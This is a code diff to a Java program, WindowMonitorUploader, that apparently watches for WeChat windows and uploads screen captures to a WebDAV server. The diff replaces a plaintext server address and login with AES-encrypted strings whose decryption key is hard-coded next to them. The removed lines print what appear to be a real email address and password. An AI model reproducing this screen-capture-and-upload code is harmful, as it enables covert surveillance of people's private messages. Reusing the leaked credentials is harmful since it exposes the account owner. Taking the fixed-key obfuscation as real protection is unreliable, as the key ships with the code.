@@ -33,6 +33,7 @@ import com.sun.jna.Native;
 import com.sun.jna.platform.win32.User32;
 import com.sun.jna.platform.win32.WinDef;
 
+import javax.crypto.SecretKey;
 import javax.imageio.ImageIO;
 import java.awt.Rectangle;
 import java.awt.Robot;
@@ -47,14 +48,17 @@ import java.time.format.DateTimeFormatter;
  */
 public class WindowMonitorUploader {
 
-    private static final String WEBDAV_URL = "https://file.tlcsdm.com/dav/";
-    private static final String USERNAME = "tang97155@163.com";
-    private static final String PASSWORD = "V9XaZs0z6rugAj4Ztn9iFXpXMS80v3J6";
+    private static final String FIXED_KEY_STR = "tLcsdMwIndoWmOnt";
+    private static String WEBDAV_URL = "cN2tIFNhoFyjJ44hmiYoyWKtJEbDF0HMquNp0XX98DM=";
+    private static final String USERNAME = "DVlKm5MyVy9+MVLS7wTVHhx6gVPPLfi6YqM0P3oP9KQ=";
+    private static final String PASSWORD = "jg8PewVdbl3x1KDrc24iwBhvVutacFQFq6MQaxt807PTn0gaMhrLNPqUt1kLi+Bb";
     private static final String MATCH_KEYWORD = "微信";
     private static final long interval = 2000;
 
-    public static void main(String[] args) {
-        Sardine sardine = SardineFactory.begin(USERNAME, PASSWORD);
+    public static void main(String[] args) throws Exception {
+        SecretKey key = AesUtil.getFixedKey(FIXED_KEY_STR);
+        WEBDAV_URL = AesUtil.decrypt(WEBDAV_URL, key);
+        Sardine sardine = SardineFactory.begin(AesUtil.decrypt(USERNAME, key), AesUtil.decrypt(PASSWORD, key));
         while (true) {
             try {
                 String title = getActiveWindowTitle();
